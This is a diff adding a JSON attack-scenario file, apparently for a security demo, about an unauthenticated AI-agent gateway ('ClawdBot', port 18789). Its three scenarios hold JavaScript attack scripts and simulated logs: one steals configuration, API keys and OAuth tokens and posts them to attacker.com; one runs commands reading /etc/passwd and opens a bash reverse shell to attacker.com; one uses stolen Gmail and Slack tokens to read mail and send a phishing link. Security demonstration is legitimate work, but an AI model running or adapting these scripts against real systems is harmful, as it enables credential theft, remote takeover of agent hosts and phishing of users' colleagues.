@@ -1,0 +1,63 @@
+{
+  "name": "Gateway 未授权访问",
+  "systemPrompt": "[ClawdBot Gateway - 默认配置]\n\nGateway 配置:\n- 端口: 18789\n- 认证: 无 (auth.mode = none)\n- Tailscale: 禁用\n- 外网访问: 允许\n\n警告: 此配置存在 CVE-2025-49596 漏洞\n任何人都可以连接并执行操作\n\n暴露的实例数量 (Shodan 统计):\n- 总计: 数百个\n- 完全无认证: 8+\n- 弱认证: 50+",
+  "attacks": {
+    "gateway-config-theft": {
+      "name": "Gateway 配置窃取",
+      "description": "利用未认证的 Gateway WebSocket 接口窃取完整配置",
+      "testPayload": "// 攻击者脚本\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = () => {\n  // 获取完整配置\n  ws.send(JSON.stringify({ type: 'config.get' }));\n\n  // 获取 OAuth tokens\n  ws.send(JSON.stringify({ type: 'auth.tokens.list' }));\n\n  // 获取对话历史\n  ws.send(JSON.stringify({ type: 'conversations.list', limit: 100 }));\n};\n\nws.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  console.log('Exfiltrated:', data);\n  // 发送到攻击者服务器\n  fetch('https://attacker.com/collect', {\n    method: 'POST',\n    body: event.data\n  });\n};",
+      "conversations": {
+        "0": "（攻击者通过 Shodan 发现暴露的 ClawdBot 实例，连接 Gateway）",
+        "1": "[Gateway 日志]\n新连接: 203.0.113.42:54321\n认证: 跳过 (auth.mode = none)\n\n收到请求: config.get\n响应: {\n  \"apiKey\": \"sk-ant-xxx...\",\n  \"oauthTokens\": {...}\n}\n\n收到请求: auth.tokens.list\n响应: [Gmail, Slack, Discord tokens...]\n\n收到请求: conversations.list\n响应: [100 条对话记录...]\n\n连接关闭"
+      },
+      "logs": {
+        "0": "🌐 外部 IP 连接 Gateway: 203.0.113.42",
+        "1": "认证检查: auth.mode = none",
+        "2": "⚠️ 跳过认证，允许连接",
+        "3": "🔴 请求: config.get",
+        "4": "返回: API 密钥、OAuth Tokens",
+        "5": "🔴 请求: auth.tokens.list",
+        "6": "返回: Gmail, Slack, Discord tokens",
+        "7": "🔴 请求: conversations.list",
+        "8": "返回: 100 条对话历史",
+        "9": "🚨 CVE-2025-49596: 未授权访问，完整配置已泄露"
+      }
+    },
+    "gateway-rce": {
+      "name": "Gateway 远程命令执行",
+      "description": "利用未认证的 Gateway 执行任意命令",
+      "testPayload": "// 攻击者脚本 - 远程命令执行\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = () => {\n  // 执行系统命令\n  ws.send(JSON.stringify({\n    type: 'tool.call',\n    tool: 'run_command',\n    params: {\n      command: 'id && whoami && cat /etc/passwd'\n    }\n  }));\n\n  // 建立反向 shell\n  ws.send(JSON.stringify({\n    type: 'tool.call',\n    tool: 'run_command',\n    params: {\n      command: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n    }\n  }));\n};",
+      "conversations": {
+        "0": "（攻击者通过暴露的 Gateway 执行命令）",
+        "1": "[Gateway 日志]\n收到工具调用请求:\n  tool: run_command\n  params: { command: \"id && whoami && cat /etc/passwd\" }\n\n执行结果:\nuid=1000(clawdbot) gid=1000(clawdbot)\nclawdbot\nroot:x:0:0:root:/root:/bin/bash\n...\n\n收到工具调用请求:\n  tool: run_command\n  params: { command: \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\" }\n\n[连接已建立到 attacker.com:4444]"
+      },
+      "logs": {
+        "0": "🌐 收到 tool.call 请求",
+        "1": "🔴 执行命令: id && whoami && cat /etc/passwd",
+        "2": "返回: 系统用户信息",
+        "3": "🔴 执行命令: bash 反向 shell",
+        "4": "🚨 反向 Shell 已建立到攻击者服务器",
+        "5": "🚨 系统已被完全控制"
+      }
+    },
+    "gateway-account-takeover": {
+      "name": "Gateway 账户接管",
+      "description": "利用窃取的 OAuth Token 接管用户的消息平台账户",
+      "testPayload": "// 攻击者脚本 - 账户接管\nconst ws = new WebSocket('ws://target:18789/gateway');\n\nws.onopen = async () => {\n  // 获取 tokens\n  const response = await sendAndWait(ws, { type: 'auth.tokens.list' });\n\n  // 使用 Gmail token 读取邮件\n  const gmailToken = response.tokens.gmail;\n  const emails = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages', {\n    headers: { 'Authorization': 'Bearer ' + gmailToken }\n  });\n\n  // 使用 Slack token 发送消息\n  const slackToken = response.tokens.slack;\n  await fetch('https://slack.com/api/chat.postMessage', {\n    method: 'POST',\n    headers: { 'Authorization': 'Bearer ' + slackToken },\n    body: JSON.stringify({\n      channel: '#general',\n      text: '紧急通知：请点击此链接重置密码 https://evil.com/reset'\n    })\n  });\n};",
+      "conversations": {
+        "0": "（攻击者使用窃取的 Token 接管账户）",
+        "1": "[攻击者操作日志]\n\n1. 使用 Gmail Token 访问邮箱:\n   - 读取最近 100 封邮件\n   - 发现敏感邮件：银行账单、密码重置链接\n\n2. 使用 Slack Token 发送钓鱼消息:\n   - 在 #general 发送：紧急通知...\n   - 在 #engineering 发送：新的代码审查请求...\n\n3. 使用 Discord Token:\n   - 修改服务器设置\n   - 发送恶意链接给所有成员\n\n账户完全被接管。"
+      },
+      "logs": {
+        "0": "🔴 使用窃取的 Gmail Token",
+        "1": "读取邮箱: 100 封邮件",
+        "2": "🔴 使用窃取的 Slack Token",
+        "3": "发送钓鱼消息到 #general",
+        "4": "🔴 使用窃取的 Discord Token",
+        "5": "修改服务器设置",
+        "6": "🚨 多个账户已被接管",
+        "7": "🚨 横向移动: 钓鱼攻击已发送给同事"
+      }
+    }
+  }
+}
